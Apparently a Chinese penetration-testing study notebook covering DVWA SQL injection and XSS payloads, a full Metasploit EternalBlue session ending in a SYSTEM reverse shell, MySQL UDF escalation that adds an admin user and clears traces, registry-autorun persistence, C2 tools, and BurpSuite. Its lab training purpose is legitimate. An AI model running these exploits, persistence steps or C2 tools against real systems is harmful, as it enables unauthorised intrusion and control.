mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 可以看到，与low级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 SQL Injection_high级别漏洞利用 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。 需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection_impossible级别代码分析&【防御】 prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data->bindParam( ':id', $id, PDO::PARAM_INT ); $data->execute(); $row = $data->fetch(); // Make sure only 1 result is returned if( $data->rowCount() == 1 ) { // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo \"ID: {$id}First name: {$first}Surname: {$last}\"; } } } // Generate Anti-CSRF token generateSessionToken(); ?> 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为1时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 SQL注入防御： 过滤用户输入 使用预编译处理SQL语句（PDO 、Sqlparameter） 使用owasp等安全的sql处理API SQL Injection (Blind)盲注 SQL Injection（Blind）介绍 SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 盲注的分类 基于时间的盲注，注意是否有延迟 输入1 and sleep(5) # 输入1' and sleep(5) # 基于布尔的盲注，注意返回结果是否相同 输入1' and 1=1 # 输入1' and 1=2 # SQL Injection(Blind)_low级别代码分析&漏洞利用 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种：User ID exists in the database. 与 User ID is MISSING from the database. 当输入1' and 1=1 #时，返回User ID exists in the database.，当输入1' and 1=2 #时，返回User ID is MISSING from the database.，说明存在字符型SQL盲注。 其他级别的盲注漏洞和非盲注漏洞都是只有反馈上的差别，只是High级别的代码中会执行sleep(seconds)函数，目的是为了扰乱基于时间的盲注。而盲注的防御也和前面SQL注入的防御一样，在此不再赘述。 反射型XSS XSS介绍 XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 反射型XSS_low级别代码分析 Hello ' . $_GET[ 'name' ] . ''; } ?> 代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。 反射型XSS_low级别漏洞利用 输入alert('xss')，成功弹框。javascript中，alert()是弹出警告框的意思。 反射型XSS_medium级别代码分析 ', '', $_GET[ 'name' ] ); // Feedback for end user echo \"Hello ${name}\"; } ?> 这里基于黑名单用str_resplace函数过滤，采用双写绕过或者大小写绕过，也可以使用其他可以触发XSS的代码，进行轻松绕过的。 反射型XSS_medium级别漏洞利用 双写绕过：ript>alert('XSS') 大小写绕过：alert('XSS') 反射型XSS_hight级别代码分析&漏洞利用 Hello ${name}\"; } ?> High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式彻底过滤script，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。因此，使用其他代码代替script，例如：（如果图片的src所指的路径不存在图片，则 弹框） 反射型XSS_impossible级别代码分析&【防御】 Hello ${name}\"; } // Generate Anti-CSRF token generateSessionToken(); ?> Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、转换为HTML实体，防止浏览器将其作为HTML元素。 防御： 过滤用户输入 使用htmlspecialchars()过滤 使用owasp等安全xss处理API 存储型XSS 介绍 存储型XSS又称为持久型跨站脚本，比反射型XSS更具威胁性，并且可能影响到Web服务器自身安全。它的代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候将触发代码执行。 存储型XSS_low级别代码分析 ' . mysql_error() . '' ); //mysql_close(); } ?> 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。存在Name和Message两处XSS，在输入时存在字符长度限制，可以通过修改maxlength进行绕过或者抓包修改进行绕过。 其他级别的存储型XSS也和反射型XSS类似，绕过方法以及防御也相同，因此不再赘述。 DOM型XSS 介绍 DOM型XSS的产生并没有和后台服务器产生交互，而是通过浏览器的DOM树解析产生的。 DOM型XSS_low级别代码分析&漏洞利用 #服务器端没有任何php代码，查看前端页面源代码，处理用户输入的只有前端的js代码： if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); document.write(\"\" + decodeURI(lang) + \"\"); document.write(\"----\"); } document.write(\"English\"); document.write(\"French\"); document.write(\"Spanish\"); document.write(\"German\"); 由于没有对XSS进行防御，可以直接在url后面添加payload，http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=Englishalert()弹框证明有xss的存在，浏览器在解析html dom树时就会触发js弹框代码 。 DOM型XSS_medium级别代码分析 前端代码和low级别一样，但是后端代码对url的default参数的值做了限制 不允许出现script标签，否则就将default的值设为默认的English，stripos函数还防止了大小写绕过。 DOM型XSS_medium级别漏洞利用 可以采用img来代替构造payload，同时要注意进行对标签的闭合： http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English DOM型XSS_high级别代码分析 这里采用了白名单，要求default的值必须为select选择菜单中的值。 DOM型XSS_high级别漏洞利用 可以利用字符#进行绕过，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，payload构造连接为：http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English # alert() DOM型XSS_防御 过滤用户输入 使用htmlspecialchars()过滤 使用owasp等安全xss处理API 客户端浏览器自身启动 XSS Filter Weak Session ID弱会话ID Session ID介绍 密码与证书等认证手段，一般仅仅用于登录的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。 当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。用户拿到SessionID就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。 SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此不需要进行密码破解。 Weak Session ID_low级别代码分析 从服务端的代码端可以看出，sessionID只是从0开始累加，所以可以较容易的猜测出别人的SessionID。 Weak Session ID_medium级别代码分析 将cookie的值改成了当前的时间，看起来比low的随机了点，但是经过连续的收集后就很容易发现其中的规律。也可以用时间戳转换工具进行转换。 Weak Session ID_high级别代码分析 这里将cookie的值进行了md5加密，并且还设置了cookie过期时间进一步增加SessionID的安全性，但不足的是进行md5加密的值是0的累加。也可以用解密网站进行md5解密。 Weak Session ID_impossible级别代码分析&【防御】 这里将cookie值 = sha1(随机数+时间戳+固定字符串“impossbile”)，用了sha1()函数对cookie进行了加密，从而降低了被破解的可能性。 第八阶段-权限提升 提权基础 服务器配置（apache2为例） 提权本质 提权本质就是提升自己在服务器中的权限，获得更大的权限。 例如：在Windows下普通用户，通过提权获得Administrator或system权限；在Linux中通过执行编译后的程序，从普通用户权限提升到roo账号权限。 提权分类 提权分为本地提权和远程提权；也可以分为系统提权和第三方软件提权 权限配置 一般情况下，Web服务会给与一个特定低权限用户维护服务，避免给与过高权限。 Windows系统提权基础命令 ipconfig /all 查看网卡、ip、DNS、DHCP等信息 netstat -an 获取当前主机所有端口的开放情况及网络连接情况 net start 命令查看系统所开启的所有服务 net stop 服务名称 关闭服务，如杀毒软件 tasklist /svc 获取运行的进程名称、服务和PID taskkill /PID 号码 结束进程，taskkill /? 获取帮助信息 net user username password /add 添加用户 net localgroup administrators username /add 添加用户到管理员组 Windows提权辅助工具 辅助工具介绍 Windows-Exploit-Suggester 此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁。https://github.com/GDSSecurity/Windows-Exploit-Suggester/ 辅助工具安装 环境：python2.7、安装xlrd模块。python -m pip install xlrd 执行 --update以获取漏洞文件。会这当前目录下创建一个*mssb.xls文件 辅助工具命令行介绍 使用-h参数获取帮助信息 辅助工具使用技巧 查看本机补丁与漏洞文件中，可能存在的POC。 实操： >python windows-exploit-suggester.py --update [*] initiating winsploit version 3.3... [+] writing to file 2020-04-14-mssb.xls [*] done >systeminfo > win2003.txt >python windows-exploit-suggester.py --audit -i win2003.txt -d 2020-04-14-mssb.xls [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file ... 8-4Windows远程提权（以ms17-010为例） 远程提权 在授权的情况下，针对目标机器进行渗透测试，需要对目标进行提权。可以首先扫描系统是否存在可利用漏洞，探测是否可以利用。 如果可以直接利用获得最高权限，那么就不需要本地提权，直接远程提权拿到最高权限。 ms17-010介绍 MS17-010是一个安全类型的补丁，MS17-010更新修复了Microsoft Windows中的漏洞。 如果攻击者向 Microsoft 服务器消息块 1.0 (SMBv1) 服务器发送经特殊设计的消息，则其中最严重的漏洞可能允许远程代码执行。 WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 勒索病毒是自熊猫烧香以来影响力最大的病毒之一。 扫描探测ms17-010漏洞 在metasploit下直接利用ms17-010的漏洞扫描模块进行探测。 利用ms17-010漏洞提权 在Metasploit下集成了ms17-010的漏洞利用模块 。 实操 #扫描探测ms17-010漏洞 root@kali:~# msfconsole msf5 > search ms17-010 msf5 > use auxiliary/scanner/smb/smb_ms17_010 msf5 auxiliary(scanner/smb/smb_ms17_010) > show options msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.177.134 msf5 auxiliary(scanner/smb/smb_ms17_010) > run [+] 192.168.177.134:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit) [*] 192.168.177.134:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed #以上探测结果表明靶机存在ms17-010漏洞 #下面开始利用ms17-010漏洞提权 msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) > show options msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf5 exploit(windows/smb/ms17_010_eternalblue) > show options msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.177.134 msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.177.128 msf5 exploit(windows/smb/ms17_010_eternalblue) > show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.177.134 yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.177.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit [*] Started reverse TCP handler on 192.168.177.128:4444 [+] 192.168.177.134:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit) [*] 192.168.177.134:445 - Connecting to target for exploitation. [+] 192.168.177.134:445 - Connection established for exploitation. [+] 192.168.177.134:445 - Target OS selected valid for OS indicated by SMB reply [*] 192.168.177.134:445 - CORE raw buffer dump (23 bytes) [*] 192.168.177.134:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61 Windows 7 Ultima [*] 192.168.177.134:445 - 0x00000010 74 65 20 37 36 30 30 te 7600 [+] 192.168.177.134:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 192.168.177.134:445 - Trying exploit with 12 Groom Allocations. [*] 192.168.177.134:445 - Sending all but last fragment of exploit packet [*] 192.168.177.134:445 - Starting non-paged pool grooming [+] 192.168.177.134:445 - Sending SMBv2 buffers [+] 192.168.177.134:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 192.168.177.134:445 - Sending final SMBv2 buffers. [*] 192.168.177.134:445 - Sending last fragment of exploit packet! [*] 192.168.177.134:445 - Receiving response from exploit packet [+] 192.168.177.134:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 192.168.177.134:445 - Sending egg to corrupted connection. [*] 192.168.177.134:445 - Triggering free of corrupted buffer. [*] Sending stage (206403 bytes) to 192.168.177.134 [*] Meterpreter session 2 opened (192.168.177.128:4444 -> 192.168.177.134:52582) at 2020-04-15 23:14:27 +0800 [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter > shell Process 3736 created. Channel 1 created. Microsoft Windows [�汾 6.1.7600] ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ���� C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32> #成功利用ms17-010漏洞 MySQL UDF提权 UDF介绍 UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。 在提权过程中，经常使用mysql 的udf.dll进行提权。并且提权之前，要上传udf.dll到指定的目录下。 使用select @@plugin_dir;或show variables like 'plugin%';查看具体目录。 MySQL 5.0 MySQL>5.1，必须要把udf.dll文件放到MySQL安装目录下的lib\\plugin文件夹下才能创建自定义函数。）； 修改目录方式： mysqld.exe --plugin-dir=具体目录 mysqld.exe --defaults-file=具体目录 mysql.ini配置文件 plugin_dir=具体目录 udf.dll获取 sqlmap下自带了对应提权使用的udf库。可以直接下载使用，但是sqlmap进行加密，需要解密。 在D:\\SQLmap\\extra\\cloak目录下执行命令python cloak.py -d -i D:\\SQLmap\\data\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_生成udf.dll（注意系统位数） 上传UDF 将udf.dll文件上传到指定目录下。select @@plugin_dir;或show variables like 'plugin%'; 利用sql注入进行上传select load_file() into dumpfile “具体路径” 直接利用蚁剑上传到具体目录下。（一般Lib、Plugin文件夹需要手工建立；还有要重命名文件） 执行提权命令 #从udf.dll文件中引入自定义函数sys_eval create function sys_eval returns string soname 'udf.dll'; #判断是否成功创建自定义函数 select * from mysql.func where name = 'sys_eval'; #运行dir命令验证自定义函数是否正常运行 select sys_eval('dir'); #新建密码为123的用户user1 select sys_eval('net user user1 123 /add'); #将用户user1添加到administrators组 select sys_eval('net localgroup administrators user1 /add'); #清除痕迹 drop function sys_eval; 第九阶段-权限维持 权限维持介绍 权限维持的原因 某目标服务器初始化现阶段存在安全漏洞，可以被利用拿到服务器权限。一段时间后，系统管理员对系统进行升级，打补丁（patch），系统不存在安全漏洞，导致无法利用漏洞获得服务器权限。 合法且被授权的渗透测试人员，利用权限维持为了证明服务器存在对应的安全漏洞。 权限维持案例-环境介绍 目标机器：win7 没有ms17-010补丁。 利用Metasploit中ms17-010对应的Exploit可以进行渗透测试，获取”临时”的System权限。（当补丁打上就不能利用ms17-010获取System权限）。 权限维持案例 使用Metasploit run persistence模块run persistence -U -i 10 -p 4444 -r 192.168.177.128 -S：系统启动时加载； -X：开机时自动加载； -U：用户登录时加载。该方式会在HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。推荐使用该参数； -i：设置反向连接间隔时间，单位为秒； -p：设置反向连接的端口号（攻击机）； -r：设置反向连接的ip地址（攻击机）。 #实操 meterpreter > run persistence -X -i 5 -p 1234 -r 192.168.177.128 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe. [!] Example: run post/windows/manage/persistence_exe OPTION=value [...] [*] Running Persistence Script [*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-AUH1U25K717_20200418.3452/WIN-AUH1U25K717_20200418.3452.rc [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.177.128 LPORT=1234 [*] Persistent agent script is 99643 bytes long [+] Persistent Script written to C:\\Windows\\TEMP\\yPUGtWnZGTYBV.vbs [*] Executing script C:\\Windows\\TEMP\\yPUGtWnZGTYBV.vbs [+] Agent executed with PID 2996 [*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\wbKiWQgLFSGi [+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\wbKiWQgLFSGi #以上在靶机上创建了开机自启的反弹shell #下面用metasploit连接前面创建的shell msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set lhost 192.168.177.128 lhost => 192.168.177.128 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.177.128:1234 [*] Sending stage (179779 bytes) to 192.168.177.134 [*] Meterpreter session 1 opened (192.168.177.128:1234 -> 192.168.177.134:49187) at 2020-04-18 23:38:01 +0800 meterpreter > 权限维持 - TrevorC2工具 TrevorC2工具介绍 TrevorC2是基于C/S架构的通过浏览网站，进行命令控制。由于时间间隔不同且不使用POST请求进行数据提交，因此检测TrevorC2变得困难很多，这样更加隐蔽，不容易被察觉。 TrevorC2有两个组件一客户机和服务器。目前trevorc2_client.py支持Windows、MacOS和Linux。 组成： trevorc2_server.py trevorc2_client.py TrevorC2工具安装 git clone https://github.com/trustedsec/trevorc2.git pip install -r requirements.txt TrevorC2工具使用 ./trevorc2_server.py 启动TrevorC2服务端（攻击机） gedit trevorc2_client.py 修改TrevorC2客户端IP设置 python trevorc2_client.py 启动TrevorC2客户端（靶机） TrevorC2建立连接 list 查看建立的会话 interact 会话ID 连接会话 权限维持 - Dnscat2工具 Dnscat2工具介绍 dnscat2是基于C/S架构的一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell等等。 服务端用来建立监听，等待连接。可以说是一个用来建立DNS服务端的程序。 Dnscat2工具安装 服务端安装：（攻击机） git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server/ gem install bundler bundler install 客户端安装：（靶机） git clone https://github.com/iagox86/dnscat2.git cd dnscat2/client/ make Dnscat2工具使用 服务端 ruby dnscat.rb 客户端 /dnscat2 --dns server=127.0.0.1,port=53 Dnscat2建立连接 session #查看已建立的连接 session -i 1 #对会话进行连接 ping #测试连接情况 shell #建立反弹shell ctrl-z #按键Ctrl+Z退出当前会话 session -i 2 #连接反弹shell 权限维持 - JsRAT工具 JsRAT工具介绍 JsRAT工具是用来建立以HTTP协议为基础的命令控制通道。 JsRAT是一款使用Python脚本开发的工具，利用JS反弹shell，并不会在硬盘安装任何程序，避免被发现。 JsRAT工具安装 git clonehttps://github.com/Hood3dRob1n/JSRat-Py.git JsRAT工具使用 ./JSRat.py -i IP地址 -p 端口 使用客户端浏览器访问以上IP和端口，以获得执行命令 JsRAT建立连接 在命令行中执行浏览器中显示的命令。 在攻击机中获得反弹shell end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-18 17:15 "},"第二阶段-Web安全篇/BurpSuite学习使用.html":{"url":"第二阶段-Web安全篇/BurpSuite学习使用.html","title":"BurpSuite学习使用","keywords":"","body":"BurpSuite学习使用 BurpSuite工具全解析 BurpSuite安装&配置 介绍：BurpSuite是一款用JAVA语言编写的跨平台软件，用于攻击web应用程序的集成平台，包含了许多工具。BurpSuite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。 配置环境：下载并安装JRE JDK是java开发工具包，是程序员使用java语言编写java程序所需的开发工具包，是提供给程序员使用的。JRE是java运行时环境，包含了java虚拟机，java基础类库。是使用java语言编写的程序运行所需要的软件环境，是提供给想运行java程序的用户使用的。而JDK包含了JRE。 安装：直接在官网上下载社区版即可满足使用。 在浏览器中安装BurpSuite CA证书 配置浏览器代理： 配置BurpSuite代理：（一般默认即可） BurpSuite Proxy（代理）模块 Proxy模块是BurpSuite以用户驱动测试流程功能的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端和服务端之间传输的数据。 Intercept（截断）部分： Forward表示将截断的HTTP或HTTPS请求发送到服务器。 Drop表示将截断的HTTP或HTTPS请求丢弃。 Intercept is on 和 Intercept is off 表示开启或关闭代理截断功能。 Action表示将代理截断的HTTP或HTTPS请求发送到其他模块或做其他处理。 对Intercept进行Raw、Params、Header、Hex切换查看不同的数据格式。 HTTP history部分 HTTP history用来查看提交过的HTTP请求。 Filter可以过滤显示某些HTTP请求。点击Filter就可以打开。对于指定URL可以选中右键点击，执行其他操作。WebSockets hIstory与HTTP history功能类似。 Options部分 Options具有的功能：代理监听设置、截断客户端请求、截断服务器响应、截断WebSocket通信、服务端响应修改（绕过JS验证文件上传）、匹配与替换HTTP消息中的内容、通过SSL连接Web服务器配置、其他配置选项。 设置 Proxy Listener（代理监听器） 通过设置Proxy Listeners来截断数据流量。比如设置监听端口等。 设置 Intercept Client Requests（拦截客户端请求） 通过设置Intercept Client Requests来截断符合条件的HTTP请求。 设置 Intercept Server Response（服务器响应拦截） 通过设置Intercept Server Response来筛选出符合条件的HTTP响应。 设置拦截Websockets信息以及Response Modification（响应操作）的内容 设置 Match and Replace 可以修改和替换HTTP请求和HTTP响应中的内容。 设置 SSL Pass Through 设置使用Burp直接通过SSL直连到目标服务器。 其他设置Miscellaneous BurpSuite截断WebAPP流量 WebAPP介绍 目前WebApp(手机App)的通信任然使用HTTP协议进行对应的通信。可以通过Burp设置代理，然后手机设置网络代理，通过Burp截断手机APP流量。 手机网络设置 在手机网络设置中，填写对应的代理 BurpSuite截断手机APP流量 BurpSuite剔除JS脚本（绕过JS文件上传验证） JavaScript介绍 JavaScript一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML网页上使用，用来给HTML网页增加动态功能。 例如：对于文件上传的JS验证 BurpSuite截断响应剔除JavaScript脚本 在Proxy模块中的Option下Response Modification，可以勾选Remove all JavaScript剔除JavaScript脚本。 浏览器审计工具进行手动剔除JavaScript脚本 F12手动剔除 BurpSuite Target（目标）模块 Target介绍 Target模块主要包含site map（站点地图）、scope（作用域）、issue definition（问题定义）三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息。 Target Scope介绍 作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。 Target Site Map介绍 的左边为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。 基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取。 Target Site Map分析 通过对站点地图 Sitemap进行分析，分析其中页面的提交参数等。 对于同一Web系统，不登录与登录系统是具有不同的响应的。针对这样的情况可以使用Burpsuite中Sitemap比较两者的区别。 Burpsuite Dashboard（仪表盘）模块 Burp 1.x具有的Spider和Scanner模块被集合到了Burp 2.x中的Dashboard模块中。 Dashboard介绍 Dashboard分为三部分：Tasks（任务）、Event log（事件日志）、issue activity（动态发现的问题）。 Tasks部分 Tasks 中自带了两个模版，相当于以前版本的spider 和scanner 模块的结合体，支持自定义创建。 live passive crawl from proxy(all traffic) #（来自代理（所有流量）的被动抓取） live audit from proxy(all traffic) # （来自代理（所有流量）的实时审计） Event log：这个主要是BurpSuite出现问题或异常状况查看日志用。 BurpSuite Intruder（入侵）模块 Intruder介绍 在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个payload，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。 使用场景 标识符枚举Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。 提取有用的数据在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符 提取一些其他的数据。 模糊测试很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。 使用步骤 设置代理，开启Burpsuite截断需要测试的请求。 将截断的请求发送到Burpsuite Intruder，设置Payload测试。 筛选Intruder结果，选取有用信息。 Intruder Positions部分 攻击模式选择 Sniper（狙击手） 需要字典：1个【payload set部分只能选择1】 变量数量：不限 加载顺序：将字典依次填入所有变量中。 Battering ram（攻城槌） 需要字典：1个【payload set部分只能选择1】 变量数量：不限 加载顺序：将字典同时填入所有变量中 Pitchfork（草叉） 需要字典：N个【payload set可以选择N个】 变量数量：N个【需要和字典数量相同】 加载顺序：字典和变量分别对应，同时填入对应变量中；且字典1中的payload与字典2中的payload为映射关系。 Cluster bomb（集束炸弹） 需要字典：N个【payload set可以选择N个】 变量数量：N个【需要和字典数量相同】 加载顺序：字典和变量分别对应，分别填入对应变量中；且字典1中的payload与字典2中的payload为笛卡尔积的关系。 突然发现有份burpsuite文档还没有看......里面的内容比我做的笔记还详细.......那我还做这笔记干嘛[哭笑] end. BurpSuite原理到实战 攻击身份验证系统 身份验证是应用程序防御恶意攻击的核心。它是防止未经授权访问的第一线。如果攻击者可以绕过防御措施，他通常会完全控制应用程序的功能，并可以不受限制地访问其中的数据。如果没有强大的身份验证依赖，其他核心安全机制（例如会话管理和访问控制）都不会有效。 身份验证如今复杂多样，有传统的登陆，也有双因素（2FA）认证【常用的双因素组合是密码 + 某种个人物品，如银行卡+密码】，还有单点登陆（SSO）【当用户在身份认证服务器上登录一次以后，即可获得访问单点登录系统中其他关联系统和应用软件的权限】，0Auth2.0认证【第三方应用认证】。如图就是传统登陆的情况，而针对不同的认证模式，利用Burpsuite进行测试的方式也是不同的，这次就只针对传统登陆的情况。 SQL时间盲注 基于时间的盲注是实际漏洞挖掘场景中最为常用的一个注入手段，因为相比于报错注入或者是布尔盲注，针对基于时间盲注的防御措施十分稀少，较多的开发人员专注于页面的输出控制而忽略了基于时间盲注这种无需关注输出的内容而是针对输出过程做判断的手段。 sleep()或benchmark()函数，sleep(5);延迟5s，benchmark(1e8,11);执行10^8次1\\1达到延迟。 绕过前端控件限制 比如你在电商平台购物的时候，各种购买条件都是被限制住的，比如数量只能填写数字，收件人的手机号必须符合手机号码的格式，如果不这么做，那页面就会发出提示的信息，告诉你现在的操作是不被允许的，在大部分情况下，都是通过前端JS来校验用户的输入，从而判断出操作是否规范，这就是前端JS验证。 隐藏表单最直观的体现就是，在最后支付的时候，客户仅仅只需要点击一个确认按钮，后台就能知道你要买的东西是什么，需要付多少钱，而不需要用户一个框一个框的填写金额，数量，商品名等等，这都是因为在用户点击确认按钮后，发送的http请求往往是携带更多参数的，这些都是被隐藏在表单之中杜绝被用户任意篡改的。 客户端的输入是多种多样的，如果web应用程序仅仅依靠客户端控件来控制客户端提交给服务器的数据，往往会产生安全漏洞。比较常见的就有：XX平台0元购买苹果手机，xx运营商平台无视用户绑定任意号码充值，这些都是因为客户端校验的不安全性所导致的漏洞。 扫描网站 